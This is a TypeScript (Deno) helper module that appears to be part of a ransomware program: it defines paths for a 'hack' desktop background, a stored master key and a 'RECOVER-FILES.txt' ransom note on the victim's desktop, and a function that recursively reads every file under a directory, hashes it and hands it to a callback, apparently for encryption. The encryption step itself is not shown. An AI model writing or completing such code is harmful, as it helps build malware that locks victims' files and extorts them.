import { walk, type WalkEntry } from "@std/fs/walk";
import { getHashes } from "./crypto.ts";
import { join } from "@std/path/join";

export function getHomedir() {
  return Deno.env.get("HOME");
}

export function getImagePath(homedir: string) {
  return join(homedir, ".local", "share", "hack_background.png");
}

export function getMasterkeyPath(homedir: string) {
  return join(homedir, ".local", "share", "masterkey.json");
}

export function getNotePath(homedir: string) {
  return join(homedir, "Desktop", "RECOVER-FILES.txt");
}

export async function runForFiles(
  dir: string,
  hashes: string[],
  callback: (
    entry: WalkEntry,
    hashes: {
      sha512: string;
      sha384: string;
      sha256: string;
      sha1: string;
      md5: string;
    },
    data: Uint8Array<ArrayBuffer>,
  ) => Promise<void>,
) {
  const promises = [];
  for await (
    const fileEntry of walk(dir, {
      includeDirs: false,
      includeFiles: true,
      includeSymlinks: false,
    })
  ) {
    let data: Uint8Array<ArrayBuffer> | undefined = undefined;
    try {
      data = await Deno.readFileSync(fileEntry.path);
    } catch (error) {
      console.error(error);
    }
    if (!data) {
      continue;
    }
    const calculatedHashes = await getHashes(data);
    if (
      hashes.length === 0 ||
      hashes.find((hash) => Object.values(calculatedHashes).includes(hash))
    ) {
      promises.push(callback(fileEntry, calculatedHashes, data));
    }
  }
  await Promise.all(promises);
}
